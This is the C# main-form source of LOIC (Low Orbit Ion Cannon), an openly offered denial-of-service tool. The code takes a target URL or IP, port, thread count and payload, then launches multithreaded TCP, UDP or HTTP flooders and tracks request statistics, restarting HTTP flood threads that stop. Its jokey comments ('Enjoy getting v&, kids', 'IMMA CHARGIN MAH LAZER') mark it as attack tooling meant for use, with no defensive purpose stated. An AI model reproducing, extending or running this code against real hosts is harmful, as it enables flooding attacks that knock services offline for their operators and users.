/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Net;
using System.Windows.Forms;
using System.Globalization;

namespace LOIC
{
	public partial class frmMain : Form
	{
		#region Fields
		private bool attack;
		private static XXPFlooder[] xxp;
		private static HTTPFlooder[] http;

		private static string sIP, sData, sSubsite;
		private static int iPort, iThreads, iProtocol, iDelay, iTimeout;
		private static bool bResp, intShowStats;
		#endregion

		#region Constructors
		public frmMain()
		{
			InitializeComponent();
		}
		#endregion

		#region Event handlers
		private void frmMain_Load(object sender, EventArgs e)
		{
			this.Text = String.Format("{0} | When harpoons, air strikes and nukes fails | v. {1}", Application.ProductName, Application.ProductVersion);
		}

		private void cmdTargetURL_Click(object sender, EventArgs e)
		{
			string url = txtTargetURL.Text.ToLower();
			if (url.Length == 0)
			{
				using (var frmWtf = new frmWtf())
				{
					frmWtf.Show();
					MessageBox.Show("A URL is fine too...", "What the shit.");
				}
				return;
			}
			if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
			else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
			txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList[0].ToString();
		}

		private void cmdTargetIP_Click(object sender, EventArgs e)
		{
			if (txtTargetIP.Text.Length == 0)
			{
				using (var frmWtf = new frmWtf())
				{
					frmWtf.Show();
					MessageBox.Show("I think you forgot the IP.", "What the shit.");
				}
				return;
			}
			txtTarget.Text = txtTargetIP.Text;
		}

		private void txtTarget_Enter(object sender, EventArgs e)
		{
			cmdAttack.Focus();
		}

		private void cmdAttack_Click(object sender, EventArgs e)
		{
			if (!attack)
			{
				attack = true;
				try
				{
					sIP = txtTarget.Text;

					if (!Int32.TryParse(txtPort.Text, out iPort))
						throw new Exception("I don't think ports are supposed to be written like THAT.");

					if (!Int32.TryParse(txtThreads.Text, out iThreads))
						throw new Exception("What on earth made you put THAT in the threads field?");

					if (String.IsNullOrEmpty(txtTarget.Text) || String.Equals(txtTarget.Text, "N O N E !"))
						throw new Exception("Select a target.");

					iProtocol = 0;
					if (String.Equals(cbMethod.Text, "TCP")) iProtocol = 1;
					if (String.Equals(cbMethod.Text, "UDP")) iProtocol = 2;
					if (String.Equals(cbMethod.Text, "HTTP")) iProtocol = 3;
					if (iProtocol == 0)
						throw new Exception("Select a proper attack method.");

					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");

					if (!txtSubsite.Text.StartsWith("/") && (iProtocol == 3))
						throw new Exception("You have to enter a subsite (for example \"/\")");

					if (!Int32.TryParse(txtTimeout.Text, out iTimeout))
						throw new Exception("What's up with something like that in the timeout box? =S");

					bResp = chkResp.Checked;
				}
				catch (Exception ex)
				{
					using (var frmWtf = new frmWtf())
					{
						frmWtf.Show();
						MessageBox.Show(ex.Message, "What the shit.");
					}
					attack = false;
					return;
				}

				cmdAttack.Text = "Stop flooding";

				if (iProtocol == 1 || iProtocol == 2)
				{
					xxp = new XXPFlooder[iThreads];
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
						xxp[a].Start();
					}
				}
				else if (iProtocol == 3)
				{
					http = new HTTPFlooder[iThreads];
					for (int a = 0; a < http.Length; a++)
					{
						http[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
						http[a].Start();
					}
				}

				tShowStats.Start();
			}
			else
			{
				attack = false;
				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
				if (xxp != null)
				{
					for (int a = 0; a < xxp.Length; a++)
					{
						xxp[a].IsFlooding = false;
					}
				}
				if (http != null)
				{
					for (int a = 0; a < http.Length; a++)
					{
						http[a].IsFlooding = false;
					}
				}
				tShowStats.Stop();
			}
		}

		private void tShowStats_Tick(object sender, EventArgs e)
		{
			if (intShowStats) return; intShowStats = true;

			bool isFlooding = false;
			if (cmdAttack.Text == "Stop for now") isFlooding = true;
			if (iProtocol == 1 || iProtocol == 2)
			{
				int iFloodCount = 0;
				for (int a = 0; a < xxp.Length; a++)
				{
					iFloodCount += xxp[a].FloodCount;
				}
				lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
			}
			if (iProtocol == 3)
			{
				int iIdle = 0;
				int iConnecting = 0;
				int iRequesting = 0;
				int iDownloading = 0;
				int iDownloaded = 0;
				int iRequested = 0;
				int iFailed = 0;

				for (int a = 0; a < http.Length; a++)
				{
					var httpFlooder = http[a];
					iDownloaded += httpFlooder.Downloaded;
					iRequested += httpFlooder.Requested;
					iFailed += httpFlooder.Failed;
					if (httpFlooder.State == ReqState.Ready || http[a].State == ReqState.Completed) iIdle++;
					if (httpFlooder.State == ReqState.Connecting) iConnecting++;
					if (httpFlooder.State == ReqState.Requesting) iRequesting++;
					if (httpFlooder.State == ReqState.Downloading) iDownloading++;
					if (isFlooding && !httpFlooder.IsFlooding)
					{
						int iaDownloaded = httpFlooder.Downloaded;
						int iaRequested = httpFlooder.Requested;
						int iaFailed = httpFlooder.Failed;
						httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
						{
							Downloaded = iaDownloaded,
							Requested = iaRequested,
							Failed = iaFailed
						};
						httpFlooder.Start();
						http[a] = httpFlooder;
					}
				}
				lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
				lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
				lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
				lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
				lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
				lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
				lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
			}

			intShowStats = false;
		}

		private void tbSpeed_ValueChanged(object sender, EventArgs e)
		{
			iDelay = tbSpeed.Value;
			if (http != null)
			{
				for (int a = 0; a < http.Length; a++)
				{
					if (http[a] != null) http[a].Delay = iDelay;
				}
			}
			if (xxp != null)
			{
				for (int a = 0; a < xxp.Length; a++)
				{
					if (xxp[a] != null) xxp[a].Delay = iDelay;
				}
			}
		}
		#endregion
	}
}
